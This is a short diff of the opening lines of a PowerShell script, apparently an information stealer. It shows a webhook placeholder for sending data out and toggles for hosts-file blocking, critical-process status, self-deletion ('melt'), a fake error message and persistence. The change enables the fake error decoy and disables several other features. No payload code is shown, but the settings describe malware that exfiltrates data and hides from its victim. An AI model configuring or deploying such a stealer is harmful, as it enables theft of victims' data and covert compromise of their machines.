@@ -1,10 +1,10 @@
 $webhook = "YOUR_WEBHOOK_HERE" 
 $debug = $false
-$blockhostsfile = $true
-$criticalprocess = $true
+$blockhostsfile = $false
+$criticalprocess = $false
 $melt = $false
-$fakeerror = $false
-$persistence = $true
+$fakeerror = $true
+$persistence = $false
 
 if ($debug) {
     $ProgressPreference = 'Continue'
